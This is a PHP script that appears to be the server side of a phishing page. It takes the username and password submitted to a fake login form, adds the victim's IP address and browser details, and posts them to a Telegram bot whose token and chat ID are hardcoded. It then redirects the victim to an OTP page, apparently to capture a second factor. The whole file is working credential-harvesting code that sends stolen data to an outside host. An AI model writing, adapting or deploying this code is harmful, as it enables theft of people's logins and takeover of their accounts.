<?php
error_reporting(E_ALL);

function foo($botToken, $chatID, $username, $password, $message) {
    if (!empty($username) && !empty($password)) {
        $telegramAPI = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = [
            'chat_id' => $chatID,
            'text' => $message,
        ];
        $curl = curl_init($telegramAPI);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        curl_close($curl);
        sleep(5);
        header("Location: ./otp.html");
        exit;
			
    
    } else {
        echo "<script>setTimeout(function() { window.history.go(-1); document.querySelectorAll('input[type=password]').forEach(function(input) { input.value = '';}); }, 0);</script>";
        exit;
    }
}

$username = $_POST['username'] ?? "";
$password = $_POST['password'] ?? "";

$message = "----------------LOGIN---------------\n";
$message .= "USERNAMES         : " . $username . "\n";
$message .= "PASSWORD      : " . $password . "\n";
$message .= "----------------IP's INFO------------\n";
$message .= "CLIENT IP     : " . getenv("REMOTE_ADDR") . "\n";
$message .= "IP LINK       : https://www.geodatatool.com/?IP=" . getenv("REMOTE_ADDR") . "\n";
$message .= "BROWSER       : " . $_SERVER['HTTP_USER_AGENT'] . "\n";

foo('7709941137:AAF8zjnw0zcyKeUGZp4XTbxq7qM3HUii0Ko', '8055889698 ', $username, $password, $message);
?>